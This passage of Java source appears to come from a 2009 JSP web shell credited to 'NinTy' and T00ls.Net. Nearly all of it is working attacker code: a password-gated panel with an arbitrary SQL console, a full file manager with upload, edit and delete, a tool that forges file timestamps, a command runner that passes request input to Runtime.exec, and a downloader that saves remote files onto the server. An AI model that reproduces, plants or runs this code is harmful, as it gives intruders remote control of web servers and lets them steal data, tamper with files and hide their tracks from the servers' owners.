"<input class=\"input\" name=\"pwd\" value=\""+Ddbo.pwd+"\" id=\"pwd\" value=\"\" type=\"text\" size=\"10\"  />"+
"DataBase:"+
" <select onchange='changeurldriver()' class=\"input\" id=\"db\" name=\"db\" >"+
" <option value='com.mysql.jdbc.Driver`jdbc:mysql://localhost:3306/mysql?useUnicode=true&characterEncoding=GBK'>Mysql</option>"+
" <option value='oracle.jdbc.driver.OracleDriver`jdbc:oracle:thin:@dbhost:1521:ORA1'>Oracle</option>"+
" <option value='com.microsoft.jdbc.sqlserver.SQLServerDriver`jdbc:microsoft:sqlserver://localhost:1433;DatabaseName=master'>Sql Server</option>"+
" <option value='sun.jdbc.odbc.JdbcOdbcDriver`jdbc:odbc:Driver={Microsoft Access Driver (*.mdb)};DBQ=C:/ninty.mdb'>Access</option>"+
" <option value=' ` '>Other</option>"+
" </select>"+
"<input class=\"bt\" name=\"connect\" id=\"connect\" value=\"Connect\" type=\"submit\" size=\"100\"  />"+
"</p>"+
"</form><script>changeurldriver('"+selectDb+"')</script>");
out.println("<form action=\""+SHELL_NAME+"\" method=\"POST\">"+
"<p><input type=\"hidden\" name=\"selectDb\" value=\""+selectDb+"\"><input type=\"hidden\" name=\"o\" value=\"executesql\"><table width=\"200\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td colspan=\"2\">Run SQL query/queries on database :</td></tr><tr><td><textarea name=\"sql\" class=\"area\" style=\"width:600px;height:50px;overflow:auto;\">"+Util.htmlEncode(Util.getStr(sql))+"</textarea></td><td style=\"padding:0 5px;\"><input class=\"bt\" style=\"height:50px;\" name=\"submit\" type=\"submit\" value=\"Query\" /></td></tr></table></p></form></table>");	
} catch (Exception e) {
//e.printStackTrace();
throw e;
}
}
}
private static class ExecuteSQLInvoker extends DefaultInvoker{
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String sql = request.getParameter("sql");
String db = request.getParameter("selectDb");
Object dbo = JSession.getAttribute(DBO);
if (!Util.isEmpty(sql)) {
if (dbo == null || !((DBOperator)dbo).isValid()) {
response.sendRedirect(SHELL_NAME+"?o=vConn");
} else {
ins.get("dbc").invoke(request,response,JSession);
Object obj = ((DBOperator)dbo).execute(sql);
if (obj instanceof ResultSet) {
ResultSet rs = (ResultSet)obj;
ResultSetMetaData meta = rs.getMetaData();
int colCount = meta.getColumnCount();
out.println("<div style='padding:10px'><p><b>Query#0 : "+Util.htmlEncode(sql)+"</b></p>");
out.println("<table border=\"0\" cellpadding=\"3\" cellspacing=\"0\"><tr class=\"head\">");
for (int i=1;i<=colCount;i++) {
out.println("<td nowrap>"+meta.getColumnName(i)+"<br><span>"+meta.getColumnTypeName(i)+"</span></td>");
}
out.println("</tr>");
Table tb = new Table();
while(rs.next()) {
Row r = new Row();
for (int i = 1;i<=colCount;i++) {
r.addColumn(new Column(rs.getString(i)));
}
tb.addRow(r);
}
out.println(tb.toString());
out.println("</table></div>");
rs.close();
((DBOperator)dbo).closeStmt();
} else {
out.println("<div style='margin:10px'><h2>affected rows : <b>"+obj+"</b></h2></div>");
}
}
} else {
ins.get("dbc").invoke(request,response,JSession);
}
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class VLoginInvoker extends DefaultInvoker {
public boolean doBefore() {return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
out.println("<style type=\"text/css\">"+
"	input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}"+
"a{font:11px Verdana;BACKGROUND: #FFFFFF;}"+
"	</style><form method=\"POST\" action=\""+SHELL_NAME+"\">"+
"	  <p><span style=\"font:11px Verdana;\">Password: </span>"+
"        <input name=\"o\" type=\"hidden\" value=\"login\">"+
"        <input name=\"pw\" type=\"password\" size=\"20\">"+
"        <input type=\"hidden\" name=\"o\" value=\"login\">"+
"        <input type=\"submit\" value=\"Login\"><br/><br/>"+
"	  "+
"<span style=\"font:11px Verdana;\">Copyright &copy; 2009 NinTy </span><a href=\"http://www.forjj.com\" target=\"_blank\">www.Forjj.com</a></p>"+
"    </form>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class LoginInvoker extends DefaultInvoker{
public boolean doBefore() {return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String inputPw = request.getParameter("pw");
if (Util.isEmpty(inputPw) || !inputPw.equals(PW)) {
response.sendRedirect(SHELL_NAME+"?o=vLogin");
return;
} else {
JSession.setAttribute(PW_SESSION_ATTRIBUTE,inputPw);
response.sendRedirect(SHELL_NAME+"?o=index");
return;
}
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class MyComparator implements Comparator<File>{
public int compare(File f1,File f2) {
if (f1 != null && f2!= null) {
if (f1.isDirectory()) {
if (f2.isDirectory()) {
return f1.getName().compareTo(f2.getName());
} else {
return -1;
}
} else { 
if (f2.isDirectory()) {
return 1;
} else {
return  f1.getName().compareTo(f2.getName());
}
}
}
return 0;
}
}
private static class FileListInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception {
try {
PrintWriter out = response.getWriter();
String path = request.getParameter("folder");
if (Util.isEmpty(path))
path = JSession.getAttribute(CURRENT_DIR).toString();
JSession.setAttribute(CURRENT_DIR,Util.convertPath(path));
File file = new File(path);
if (!file.exists()) {
throw new Exception(path+"Dont Exists !");
}
JSession.setAttribute(CURRENT_DIR,path);
File[] list = file.listFiles();
Arrays.sort(list,new MyComparator());
out.println("<div style='margin:10px'>");
String cr = null;
try {
cr = JSession.getAttribute(CURRENT_DIR).toString().substring(0,3);
}catch(Exception e) {
cr = "/";
}
File currentRoot = new File(cr);
out.println("<h2>File Manager - Current disk &quot;"+(cr.indexOf("/") == 0?"/":currentRoot.getPath())+"&quot; total  (unknow) </h2>");
out.println("<form action=\""+SHELL_NAME+"\" method=\"post\">"+
"<table width=\"98%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"margin:10px 0;\">"+
"  <tr>"+
"    <td nowrap>Current Directory  <input type=\"hidden\" name=\"o\" value=\"filelist\"/></td>"+
"	<td width=\"98%\"><input class=\"input\" name=\"folder\" value=\""+JSession.getAttribute(CURRENT_DIR)+"\" type=\"text\" style=\"width:100%;margin:0 8px;\"></td>"+
"    <td nowrap><input class=\"bt\" value=\"GO\" type=\"submit\"></td>"+
"  </tr>"+
"</table>"+
"</form>");
out.println("<table width=\"98%\" border=\"0\" cellpadding=\"4\" cellspacing=\"0\">"+
"<form action=\""+SHELL_NAME+"?o=upload\" method=\"POST\" enctype=\"multipart/form-data\"><tr class=\"alt1\"><td colspan=\"7\" style=\"padding:5px;\">"+
"<div style=\"float:right;\"><input class=\"input\" name=\"file\" value=\"\" type=\"file\" /> <input class=\"bt\" name=\"doupfile\" value=\"Upload\" type=\"submit\" /></div>"+
"<a href=\"javascript:new fso({path:'"+Util.convertPath(WEB_ROOT)+"'}).subdir()\">Web Root</a>"+
" | <a href=\"javascript:new fso({path:'"+Util.convertPath(SHELL_DIR)+"'}).subdir()\">Shell Directory</a>"+
" | <a href=\"javascript:new fso({}).mkdir()\">New Directory</a> | <a href=\"javascript:new fso({}).createFile()\">New File</a>"+
" | ");
File[] roots = file.listRoots();
for (int i = 0;i<roots.length;i++) {
File r = roots[i];
out.println("<a href=\"javascript:new fso({path:'"+Util.convertPath(r.getPath())+"'}).subdir();\">Disk("+Util.convertPath(r.getPath())+")</a>");
if (i != roots.length -1) {
out.println("|");
} 
}
out.println("</td>"+
"</tr></form>"+
"<tr class=\"head\"><td>&nbsp;</td>"+
"  <td>Name</td>"+
"  <td width=\"16%\">Last Modified</td>"+
"  <td width=\"10%\">Size</td>"+
"  <td width=\"20%\">Read/Write/Execute</td>"+
"  <td width=\"22%\">&nbsp;</td>"+
"</tr>");
if (file.getParent() != null) {
out.println("<tr class=alt1>"+
"<td align=\"center\"><font face=\"Wingdings 3\" size=4>=</font></td>"+
"<td nowrap colspan=\"5\"><a href=\"javascript:new fso({path:'"+Util.convertPath(file.getAbsolutePath())+"'}).parent()\">Goto Parent</a></td>"+
"</tr>");	
}
int dircount = 0;
int filecount = 0;
for (File f:list) {
if (f.isDirectory()) {
dircount ++;
out.println("<tr class=\"alt2\" onMouseOver=\"this.className='focus';\" onMouseOut=\"this.className='alt2';\">"+
"<td width=\"2%\" nowrap><font face=\"wingdings\" size=\"3\">0</font></td>"+
"<td><a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).subdir()\">"+f.getName()+"</a></td>"+
"<td nowrap>"+Util.formatDate(f.lastModified())+"</td>"+
"<td nowrap>--</td>"+
"<td nowrap>"+f.canRead()+" / "+f.canWrite()+" / unknow </td>"+
"<td nowrap><a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).removedir()\">Del</a> | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).move()\">Move</a> | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).pack()\">Pack</a></td>"+
"</tr>");
} else {
filecount++;
out.println("<tr class=\"alt1\" onMouseOver=\"this.className='focus';\" onMouseOut=\"this.className='alt1';\">"+
"<td width=\"2%\" nowrap><input type='checkbox' value='"+f.getName()+"'/></td>"+
"<td><a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).down()\">"+f.getName()+"</a></td>"+
"<td nowrap>"+Util.formatDate(f.lastModified())+"</td>"+
"<td nowrap>"+Util.getSize(f.length(),'B')+"</td>"+
"<td nowrap>"+
""+f.canRead()+" / "+f.canWrite()+" / unknow </td>"+
"<td nowrap>"+
"<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).vEdit()\">Edit</a> | "+
"<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).down()\">Down</a> | "+
"<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).copy()\">Copy</a> | "+
"<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).move()\">Move</a> | "+
"<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).vEditProperty()\">Property</a>");
if (f.getName().endsWith(".zip")) {
out.println(" | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).unpack()\">UnPack</a>");
} else if (f.getName().endsWith(".rar")) {
out.println(" | <a href=\"javascript:alert('Dont Support RAR,Please Use WINRAR');\">UnPack</a>");
} else {
out.println(" | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).pack()\">Pack</a>");
}
out.println("</td>"+
"</tr>");
}
}
out.println("<tr class=\"alt2\"><td align=\"center\">&nbsp;</td>"+
"  <td><a href=\"javascript:new fso({}).packBatch();\">Pack Selected</a> - <a href=\"javascript:new fso({}).deleteBatch();\">Delete Selected</a></td>"+
"  <td colspan=\"4\" align=\"right\">"+dircount+" directories / "+filecount+" files</td></tr>"+
"</table>");
out.println("</div>");
} catch (Exception e) {
e.printStackTrace();
throw e;
}
}
}
private static class LogoutInvoker extends DefaultInvoker {
public boolean doBefore() {return false;}
public boolean doAfter() {return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
Object dbo = JSession.getAttribute(DBO);
if (dbo != null)
((DBOperator)dbo).close();
Object obj = JSession.getAttribute(PORT_MAP);
if (obj != null) {
ServerSocket s = (ServerSocket)obj;
s.close();
}
Object online = JSession.getAttribute(SHELL_ONLINE);
if (online != null)
((OnLineProcess)online).stop();
JSession.invalidate();
response.sendRedirect(SHELL_NAME+"?o=vLogin");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class UploadInvoker extends DefaultInvoker {
public boolean doBefore() {return false;}
public boolean doAfter() {return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
UploadBean fileBean = new UploadBean();
response.getWriter().println(JSession.getAttribute(CURRENT_DIR).toString());
fileBean.setSavePath(JSession.getAttribute(CURRENT_DIR).toString());
fileBean.parseRequest(request);
JSession.setAttribute(MSG,"Upload File Success!");
response.sendRedirect(SHELL_NAME+"?o=index");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class CopyInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String src = request.getParameter("src");
String to = request.getParameter("to");
BufferedInputStream input = new BufferedInputStream(new FileInputStream(new File(src)));
BufferedOutputStream output = new BufferedOutputStream(new FileOutputStream(new File(to)));
byte[] d = new byte[1024];
int len = input.read(d);
while(len != -1) {
output.write(d,0,len);
len = input.read(d);
}
output.close();
input.close();
JSession.setAttribute(MSG,"Copy File Success!");
response.sendRedirect(SHELL_NAME+"?o=index");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class BottomInvoker extends DefaultInvoker {
public boolean doBefore() {return false;}
public boolean doAfter() {return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
response.getWriter().println("<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright (C) 2009 <a href=\"http://www.forjj.com\" target=\"_blank\">http://www.Forjj.com/</a>&nbsp;&nbsp;<a target=\"_blank\" href=\"http://www.t00ls.net/\">[T00ls.Net]</a> All Rights Reserved."+
"</div>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class VCreateFileInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String path = request.getParameter("filepath");
File f = new File(path);
if (!f.isAbsolute()) {
String oldPath = path;
path = JSession.getAttribute(CURRENT_DIR).toString();
if (!path.endsWith("/"))
path+="/";
path+=oldPath;
f = new File(path);
f.createNewFile();
} else {
f.createNewFile();
}
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
"<form name=\"form1\" id=\"form1\" action=\""+SHELL_NAME+"\" method=\"post\" >"+
"<h2>Create / Edit File &raquo;</h2>"+
"<input type='hidden' name='o' value='createFile'>"+
"<p>Current File (import new file name and new file)<br /><input class=\"input\" name=\"filepath\" id=\"editfilename\" value=\""+path+"\" type=\"text\" size=\"100\"  /></p>"+
"<p>File Content<br /><textarea class=\"area\" id=\"filecontent\" name=\"filecontent\" cols=\"100\" rows=\"25\" ></textarea></p>"+
"<p><input class=\"bt\" name=\"submit\" id=\"submit\" type=\"submit\" value=\"Submit\"> <input class=\"bt\"  type=\"button\" value=\"Back\" onclick=\"history.back()\"></p>"+
"</form>"+
"</td></tr></table>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class VEditInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String path = request.getParameter("filepath");
File f = new File(path);
if (f.exists()) {
BufferedReader reader = new BufferedReader(new FileReader(f));
StringBuilder content = new StringBuilder();
String s = reader.readLine();
while (s != null) {
content.append(s+"\r\n");
s = reader.readLine();
}
reader.close();
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
"<form name=\"form1\" id=\"form1\" action=\""+SHELL_NAME+"\" method=\"post\" >"+
"<h2>Create / Edit File &raquo;</h2>"+
"<input type='hidden' name='o' value='createFile'>"+
"<p>Current File (import new file name and new file)<br /><input class=\"input\" name=\"filepath\" id=\"editfilename\" value=\""+path+"\" type=\"text\" size=\"100\"  /></p>"+
"<p>File Content<br /><textarea class=\"area\" id=\"filecontent\" name=\"filecontent\" cols=\"100\" rows=\"25\" >"+Util.htmlEncode(content.toString())+"</textarea></p>"+
"<p><input class=\"bt\" name=\"submit\" id=\"submit\" type=\"submit\" value=\"Submit\"> <input class=\"bt\"  type=\"button\" value=\"Back\" onclick=\"history.back()\"></p>"+
"</form>"+
"</td></tr></table>");
}
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class CreateFileInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String path = request.getParameter("filepath");
String content = request.getParameter("filecontent");

BufferedWriter outs = new BufferedWriter(new FileWriter(new File(path)));
outs.write(content,0,content.length());
outs.close();
JSession.setAttribute(MSG,"Save File Success!");
response.sendRedirect(SHELL_NAME+"?o=index");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class VEditPropertyInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String filepath = request.getParameter("filepath");
File f = new File(filepath);
if (!f.exists())
return;
String read = f.canRead() ? "checked=\"checked\"" : "";
String write = f.canWrite() ? "checked=\"checked\"" : "";
String execute = "";
Calendar cal = Calendar.getInstance();
cal.setTimeInMillis(f.lastModified());
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
"<form name=\"form1\" id=\"form1\" action=\""+SHELL_NAME+"\" method=\"post\" >"+
"<h2>Set File Property &raquo;</h2>"+
"<p>Current file (fullpath)<br /><input class=\"input\" name=\"file\" id=\"file\" value=\""+request.getParameter("filepath")+"\" type=\"text\" size=\"120\"  /></p>"+
"<input type=\"hidden\" name=\"o\" value=\"editProperty\"> "+
"<p>Read: "+
"  <input type=\"checkbox\" "+read+" name=\"read\" id=\"checkbox\"> "+
"  Write: "+
"  <input type=\"checkbox\" "+write+" name=\"write\" id=\"checkbox2\"> "+
"  Execute: "+
"  <input type=\"checkbox\" "+execute+" name=\"execute\" id=\"checkbox3\">"+
"</p>"+
"<p>Instead &raquo;"+
"year:"+
"<input class=\"input\" name=\"year\" value="+cal.get(Calendar.YEAR)+" id=\"year\" type=\"text\" size=\"4\"  />"+
"month:"+
"<input class=\"input\" name=\"month\" value="+(cal.get(Calendar.MONTH)+1)+" id=\"month\" type=\"text\" size=\"2\"  />"+
"day:"+
"<input class=\"input\" name=\"date\" value="+cal.get(Calendar.DATE)+" id=\"date\" type=\"text\" size=\"2\"  />"+
""+
"hour:"+
"<input class=\"input\" name=\"hour\" value="+cal.get(Calendar.HOUR)+" id=\"hour\" type=\"text\" size=\"2\"  />"+
"minute:"+
"<input class=\"input\" name=\"minute\" value="+cal.get(Calendar.MINUTE)+" id=\"minute\" type=\"text\" size=\"2\"  />"+
"second:"+
"<input class=\"input\" name=\"second\" value="+cal.get(Calendar.SECOND)+" id=\"second\" type=\"text\" size=\"2\"  />"+
"</p>"+
"<p><input class=\"bt\" name=\"submit\" value=\"Submit\" id=\"submit\" type=\"submit\" value=\"Submit\"> <input class=\"bt\" name=\"submit\" value=\"Back\" id=\"submit\" type=\"button\" onclick=\"history.back()\"></p>"+
"</form>"+
"</td></tr></table>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class EditPropertyInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String f = request.getParameter("file");
File file = new File(f);
if (!file.exists())
return;

String year = request.getParameter("year");
String month = request.getParameter("month");
String date = request.getParameter("date");
String hour = request.getParameter("hour");
String minute = request.getParameter("minute");
String second = request.getParameter("second");

Calendar cal = Calendar.getInstance();
cal.set(Calendar.YEAR,Integer.parseInt(year));
cal.set(Calendar.MONTH,Integer.parseInt(month)-1);
cal.set(Calendar.DATE,Integer.parseInt(date));
cal.set(Calendar.HOUR,Integer.parseInt(hour));
cal.set(Calendar.MINUTE,Integer.parseInt(minute));
cal.set(Calendar.SECOND,Integer.parseInt(second));
if(file.setLastModified(cal.getTimeInMillis())){
JSession.setAttribute(MSG,"Reset File Property Success!");
} else {
JSession.setAttribute(MSG,"Reset File Property Failed!");
}
response.sendRedirect(SHELL_NAME+"?o=index");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
//VShell
private static class VsInvoker extends DefaultInvoker{
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String cmd = request.getParameter("command");
String program = request.getParameter("program");
if (cmd == null) cmd = "cmd.exe /c set";
if (program == null) program = "cmd.exe /c net start > "+SHELL_DIR+"/Log.txt";
if (JSession.getAttribute(MSG)!=null) {
Util.outMsg(out,JSession.getAttribute(MSG).toString());
JSession.removeAttribute(MSG);
}
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
"<form name=\"form1\" id=\"form1\" action=\""+SHELL_NAME+"\" method=\"post\" >"+
"<h2>Execute Program &raquo;</h2>"+
"<p>"+
"<input type=\"hidden\" name=\"o\" value=\"shell\">"+
"<input type=\"hidden\" name=\"type\" value=\"program\">"+
"Parameter<br /><input class=\"input\" name=\"program\" id=\"program\" value=\""+program+"\" type=\"text\" size=\"100\"  />"+
"<input class=\"bt\" name=\"submit\" id=\"submit\" value=\"Execute\" type=\"submit\" size=\"100\"  />"+
"</p>"+
"</form>"+
"<form name=\"form1\" id=\"form1\" action=\""+SHELL_NAME+"\" method=\"post\" >"+
"<h2>Execute Shell &raquo;</h2>"+
"<p>"+
"<input type=\"hidden\" name=\"o\" value=\"shell\">"+
"<input type=\"hidden\" name=\"type\" value=\"command\">"+
"Parameter<br /><input class=\"input\" name=\"command\" id=\"command\" value=\""+cmd+"\" type=\"text\" size=\"100\"  />"+
"<input class=\"bt\" name=\"submit\" id=\"submit\" value=\"Execute\" type=\"submit\" size=\"100\"  />"+
"</p>"+
"</form>"+
"</td>"+
"</tr></table>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class ShellInvoker extends DefaultInvoker{
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String type = request.getParameter("type");
if (type.equals("command")) {
ins.get("vs").invoke(request,response,JSession);
out.println("<div style='margin:10px'><hr/>");
out.println("<pre>");
String command = request.getParameter("command");
if (!Util.isEmpty(command)) {
Process pro = Runtime.getRuntime().exec(command);
BufferedReader reader = new BufferedReader(new InputStreamReader(pro.getInputStream()));
String s = reader.readLine();
while (s != null) {
out.println(Util.htmlEncode(Util.getStr(s)));
s = reader.readLine();
}
reader.close();
out.println("</pre></div>");
}
} else {
String program = request.getParameter("program");
if (!Util.isEmpty(program)) {
Process pro = Runtime.getRuntime().exec(program);
JSession.setAttribute(MSG,"Program Has Run Success!");
ins.get("vs").invoke(request,response,JSession);
}
}
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class DownInvoker extends DefaultInvoker{
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String path  = request.getParameter("path");
if (Util.isEmpty(path)) 
return;
File f = new File(path);
if (!f.exists()) 
return;
response.setHeader("Content-Disposition","attachment;filename="+URLEncoder.encode(f.getName(),PAGE_CHARSET));
BufferedInputStream input = new BufferedInputStream(new FileInputStream(f));
BufferedOutputStream output = new BufferedOutputStream(response.getOutputStream());
byte[] data = new byte[1024];
int len = input.read(data);
while (len != -1) {
output.write(data,0,len);
len = input.read(data);
}
input.close();
output.close();
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
//VDown
private static class VdInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String savepath = request.getParameter("savepath");
String url = request.getParameter("url");
if (Util.isEmpty(url))
url = "http://www.forjj.com/";
if (Util.isEmpty(savepath)) {
savepath = JSession.getAttribute(CURRENT_DIR).toString();
}
if (!Util.isEmpty(JSession.getAttribute("done"))) {
Util.outMsg(out,"Download Remote File Success!");
JSession.removeAttribute("done");
}
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
"<form name=\"form1\" id=\"form1\" action=\""+SHELL_NAME+"\" method=\"post\" >"+
"<h2>Remote File DownLoad &raquo;</h2>"+
"<p>"+
"<input type=\"hidden\" name=\"o\" value=\"downRemote\">"+
"Remote File URL:"+
"  <input class=\"input\" name=\"url\" value=\""+url+"\" id=\"url\" type=\"text\" size=\"70\"  />"+
"Save Path:"+
"<input class=\"input\" name=\"savepath\" id=\"savepath\" value=\""+savepath+"\" type=\"text\" size=\"70\"  />"+
"<input class=\"bt\" name=\"connect\" id=\"connect\" value=\"DownLoad\" type=\"submit\" size=\"100\"  />"+
"</p>"+
"</form></table>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class DownRemoteInvoker extends DefaultInvoker {
public boolean doBefore(){return true;}
public boolean doAfter(){return true;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String downFileUrl = request.getParameter("url");
String savePath = request.getParameter("savepath");
if (Util.isEmpty(downFileUrl) || Util.isEmpty(savePath))
return;
URL downUrl = new URL(downFileUrl);
URLConnection conn = downUrl.openConnection();
BufferedInputStream in = new BufferedInputStream(conn.getInputStream());
BufferedOutputStream out = new BufferedOutputStream(new FileOutputStream(new File(savePath)));
byte[] data = new byte[1024];
int len = in.read(data);
while (len != -1) {
out.write(data,0,len);
len = in.read(data);
}
in.close();
out.close();
JSession.setAttribute("done","d");
ins.get("vd").invoke(request,response,JSession);
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class IndexInvoker extends DefaultInvoker {
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
ins.get("filelist").invoke(request,response,JSession);
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class MkDirInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String name = request.getParameter("name");
File f = new File(name);
if (!f.isAbsolute()) {
String path = JSession.getAttribute(CURRENT_DIR).toString();
if (!path.endsWith("/"))
path += "/";
path += name;
f = new File(path);
}
f.mkdirs();
JSession.setAttribute(MSG,"Make Directory Success!");
response.sendRedirect(SHELL_NAME+"?o=index");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class MoveInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter();
String src = request.getParameter("src");
String target  = request.getParameter("to");
if (!Util.isEmpty(target) && !Util.isEmpty(src)) {
File file = new File(src);
if(file.renameTo(new File(target))) {
JSession.setAttribute(MSG,"Move File Success!");
} else {
String msg = "Move File Failed!";
if (file.isDirectory()) {
msg += "The Move Will Failed When The Directory Is Not Empty.";
}
JSession.setAttribute(MSG,msg);
}
response.sendRedirect(SHELL_NAME+"?o=index");
}
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
}
private static class RemoteDirInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String dir = request.getParameter("dir");
File file = new File(dir);
if (file.exists()) {
deleteFile(file);
deleteDir(file);
}

JSession.setAttribute(MSG,"Remove Directory Success!");
response.sendRedirect(SHELL_NAME+"?o=index");
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
}
public void deleteFile(File f) {
if (f.isFile()) {
f.delete();
}else {
File[] list = f.listFiles();
for (File ff:list) {
deleteFile(ff);
}
}
}
public void deleteDir(File f) {
File[] list = f.listFiles();
if (list.length == 0) {
f.delete();
} else {
for (File ff:list) {
deleteDir(ff);
}
deleteDir(f);
}
}
}
private static class PackBatchInvoker extends DefaultInvoker{
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
String files = request.getParameter("files");
if (Util.isEmpty(files))
return;
String saveFileName = request.getParameter("savefilename");
File saveF = new File(JSession.getAttribute(CURRENT_DIR).toString(),saveFileName);
if (saveF.exists()) {
JSession.setAttribute(MSG,"The File \""+saveFileName+"\" Has Been Exists!");
response.sendRedirect(SHELL_NAME+"?o=index");
return;
}
ZipOutputStream zout = new ZipOutputStream(new BufferedOutputStream(new FileOutputStream(saveF)));
String[] arr = files.split(",");
for (String f:arr) {
File pF = new File(JSession.getAttribute(CURRENT_DIR).toString(),f);
ZipEntry entry = new ZipEntry(pF.getName());
zout.putNextEntry(entry);
FileInputStream fInput = new FileInputStream(pF);
int len = 0;
byte[] buf = new byte[1024];
while ((len = fInput.read(buf)) != -1) {
zout.write(buf, 0, len);
zout.flush();
}
fInput.close();
}
zout.close();
JSession.setAttribute(MSG,"Pack Files Success!");
response.sendRedirect(SHELL_NAME+"?o=index");
} catch (Exception e) {
e.printStackTrace();
throw e;
}
}
}
private static class PackInvoker extends DefaultInvoker {
public boolean doBefore(){return false;}
public boolean doAfter(){return false;}
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
